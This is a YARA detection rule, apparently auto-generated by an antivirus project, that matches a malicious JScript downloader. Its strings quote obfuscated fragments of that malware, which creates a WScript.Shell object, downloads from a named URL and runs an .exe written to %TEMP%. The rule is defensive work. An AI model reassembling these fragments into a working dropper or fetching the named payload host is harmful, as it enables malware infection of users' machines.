rule sig_20160401_e99411536f81c934194b5b66f880b1ce {
  meta:
    description = "datamaliciousorder - file 20160401_e99411536f81c934194b5b66f880b1ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "338ee35386c3c5b54ee0cea8d4b941cec4eac5019422cbc2ba830191dea5ddb5"

  strings:
    $s1  = "function HecIo(GsSo, QtRag){EckUx = EckUx * 1; return GsSo - QtRag;};" fullword ascii
    $s2  = "var VoBh = function TigUw() {return WScript[NkMf](\"WScript\"+\".Shell\");}(), KyQs = 11;" fullword ascii
    $s3  = "TnYq[WvFmn](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s4  = "if (TnYq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JieTr() {return VoBh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"h13Ce3TRUbqcKt.ex\" + \"e\";};" fullword ascii
    $s6  = "function FuAe(){return PsWc + \"\";};" fullword ascii
    $s7  = "function GdUjk() {return ((BsPk == true) && (BsPk == JpOot)) ? 1 : EckUx;};" fullword ascii
    $s8  = "var CfGas = new this[\"Date\"]();" fullword ascii
    $s9  = "}while (ZzhSq);" fullword ascii
    $s10 = "function PzsZhw(){return NkMf;};" fullword ascii
    $s11 = "function KlBwd(MgxVnf) {var QwXa = (1, 2, 3, 4, 5, MgxVnf); return QwXa;};" fullword ascii
    $s12 = "function QsOx()" fullword ascii
    $s13 = "BsPk = true; " fullword ascii
    $s14 = "return HecIo(XbCv, OqxFrs);" fullword ascii
    $s15 = "var TvVgv = false;" fullword ascii
    $s16 = "JpOot = true; " fullword ascii
    $s17 = "function KxwZie(){return 23;};" fullword ascii
    $s18 = "var BsPk = false;" fullword ascii
    $s19 = "var JpOot = false;" fullword ascii
    $s20 = "function GmfTr(AsSk){VoBh[\"R\"+\"un\"](AsSk, EckUx, EckUx);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}